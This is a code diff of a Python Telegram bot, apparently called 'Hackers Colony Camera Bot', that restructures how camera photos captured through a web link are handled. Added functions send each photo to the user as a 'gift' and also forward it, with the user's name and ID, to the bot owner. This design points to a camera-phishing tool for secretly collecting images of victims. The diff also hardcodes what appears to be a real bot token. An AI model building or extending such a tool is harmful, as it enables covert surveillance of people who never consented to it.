@@ -1,5 +1,6 @@
 import logging
 import os
+import sys
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
@@ -15,12 +16,10 @@ import asyncio
 import time
 from datetime import datetime, timedelta
 import json
-from flask import Flask, request, jsonify
+import base64
+import threading
 
-# ===== FLASK SERVER FOR WEB APP =====
-flask_app = Flask(__name__)
-
-# Telegram bot token (you should set this as environment variable)
+# ===== CONFIG =====
 BOT_TOKEN = os.environ.get('BOT_TOKEN', '8226782560:AAG2h1cqLmKnWvF7YlsdxJ3W8VPlDNe7qn8')
 OWNER_ID = int(os.environ.get('OWNER_ID', '8215819954'))
 WEB_URL = os.environ.get('WEB_URL', 'https://hco-cam.onrender.com')
@@ -157,78 +156,10 @@ def search_users(query):
 # Initialize database
 init_db()
 
-# ===== FLASK ROUTES =====
-@flask_app.route('/')
-def index():
-    return "Hackers Colony Camera Bot Server is running!"
+# ===== GLOBAL BOT APPLICATION =====
+application = None
 
-@flask_app.route('/send-photo', methods=['POST'])
-async def receive_photo():
-    try:
-        data = request.json
-        user_id = data.get('userId')
-        photo_base64 = data.get('photo')
-        label = data.get('label', 'unknown')
-        
-        if not user_id or not photo_base64:
-            return jsonify({'error': 'Missing data'}), 400
-        
-        # Store photo in database
-        add_photo(user_id, f"web_{label}")
-        
-        # Convert base64 to bytes
-        import base64
-        photo_bytes = base64.b64decode(photo_base64)
-        
-        # Send to user via bot
-        from telegram import Bot
-        bot = Bot(token=BOT_TOKEN)
-        
-        # Send to user
-        try:
-            await bot.send_photo(
-                chat_id=user_id,
-                photo=photo_bytes,
-                caption=f"🎁 Your Gift: {label}"
-            )
-        except Exception as e:
-            print(f"Failed to send to user {user_id}: {e}")
-        
-        # Send to owner
-        if int(user_id) != OWNER_ID:
-            try:
-                user_info = get_user_info(user_id)
-                user_name = f"{user_info[2]}" if user_info else f"User_{user_id}"
-                
-                await bot.send_photo(
-                    chat_id=OWNER_ID,
-                    photo=photo_bytes,
-                    caption=f"📸 From: {user_name} (ID: {user_id})\nLabel: {label}"
-                )
-            except Exception as e:
-                print(f"Failed to send to owner: {e}")
-        
-        return jsonify({'success': True, 'message': 'Photo processed'})
-        
-    except Exception as e:
-        print(f"Error in /send-photo: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@flask_app.route('/stats')
-def stats_api():
-    total_users = get_user_count()
-    total_photos = get_photo_count()
-    today_users, today_photos, active_users = get_today_stats()
-    
-    return jsonify({
-        'total_users': total_users,
-        'total_photos': total_photos,
-        'today_users': today_users,
-        'today_photos': today_photos,
-        'active_users': active_users
-    })
-
-# ===== TELEGRAM BOT HANDLERS =====
+# ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     add_user(user.id, user.username, user.first_name, user.last_name)
@@ -645,30 +576,67 @@ Select an option:""",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-# ===== MAIN FUNCTION =====
-async def main():
-    # Create Telegram application
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+# ===== PHOTO HANDLING FUNCTIONS =====
+async def send_photo_to_user(user_id, photo_bytes, label):
+    """Send photo to user via bot"""
+    try:
+        await application.bot.send_photo(
+            chat_id=user_id,
+            photo=photo_bytes,
+            caption=f"🎁 Your Gift: {label}"
+        )
+        return True
+    except Exception as e:
+        print(f"Failed to send to user {user_id}: {e}")
+        return False
+
+async def send_photo_to_owner(user_id, photo_bytes, label):
+    """Send photo to owner"""
+    try:
+        user_info = get_user_info(user_id)
+        user_name = f"{user_info[2]}" if user_info else f"User_{user_id}"
+        
+        await application.bot.send_photo(
+            chat_id=OWNER_ID,
+            photo=photo_bytes,
+            caption=f"📸 From: {user_name} (ID: {user_id})\nLabel: {label}"
+        )
+        return True
+    except Exception as e:
+        print(f"Failed to send to owner: {e}")
+        return False
+
+# ===== SETUP BOT =====
+def setup_bot():
+    """Setup and return the Telegram bot application"""
+    global application
+    
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
     
     # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("admin", admin))
-    application.add_handler(CommandHandler("broadcast", broadcast_command))
-    application.add_handler(CommandHandler("search", search_command))
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("admin", admin))
+    app.add_handler(CommandHandler("broadcast", broadcast_command))
+    app.add_handler(CommandHandler("search", search_command))
     
     # Callback handlers
-    application.add_handler(CallbackQueryHandler(joined, pattern="^joined$"))
-    application.add_handler(CallbackQueryHandler(accept, pattern="^accept$"))
-    application.add_handler(CallbackQueryHandler(stats, pattern="^stats$"))
-    application.add_handler(CallbackQueryHandler(broadcast_menu, pattern="^broadcast_menu$"))
-    application.add_handler(CallbackQueryHandler(broadcast_text, pattern="^broadcast_text$"))
-    application.add_handler(CallbackQueryHandler(user_management, pattern="^user_management$"))
-    application.add_handler(CallbackQueryHandler(search_user_menu, pattern="^search_user$"))
-    application.add_handler(CallbackQueryHandler(back_admin, pattern="^back_admin$"))
-    application.add_handler(CallbackQueryHandler(ban_user, pattern="^ban_"))
-    application.add_handler(CallbackQueryHandler(unban_user, pattern="^unban_"))
+    app.add_handler(CallbackQueryHandler(joined, pattern="^joined$"))
+    app.add_handler(CallbackQueryHandler(accept, pattern="^accept$"))
+    app.add_handler(CallbackQueryHandler(stats, pattern="^stats$"))
+    app.add_handler(CallbackQueryHandler(broadcast_menu, pattern="^broadcast_menu$"))
+    app.add_handler(CallbackQueryHandler(broadcast_text, pattern="^broadcast_text$"))
+    app.add_handler(CallbackQueryHandler(user_management, pattern="^user_management$"))
+    app.add_handler(CallbackQueryHandler(search_user_menu, pattern="^search_user$"))
+    app.add_handler(CallbackQueryHandler(back_admin, pattern="^back_admin$"))
+    app.add_handler(CallbackQueryHandler(ban_user, pattern="^ban_"))
+    app.add_handler(CallbackQueryHandler(unban_user, pattern="^unban_"))
     
-    # Start bot
+    application = app
+    return app
+
+# ===== RUN BOT =====
+def run_bot():
+    """Run the Telegram bot"""
     print("=" * 50)
     print("🎁 Hackers Colony Bot Started!")
     print(f"👑 Owner ID: {OWNER_ID}")
@@ -677,17 +645,9 @@ async def main():
     print(f"📸 Photos in DB: {get_photo_count()}")
     print("=" * 50)
     
-    # Run Flask in background
-    import threading
-    def run_flask():
-        flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
-    
-    flask_thread = threading.Thread(target=run_flask, daemon=True)
-    flask_thread.start()
-    
-    # Start bot polling
-    await application.run_polling()
+    app = setup_bot()
+    app.run_polling()
 
 if __name__ == '__main__':
-    import asyncio
-    asyncio.run(main())
+    # For Termux, just run the bot without Flask
+    run_bot()
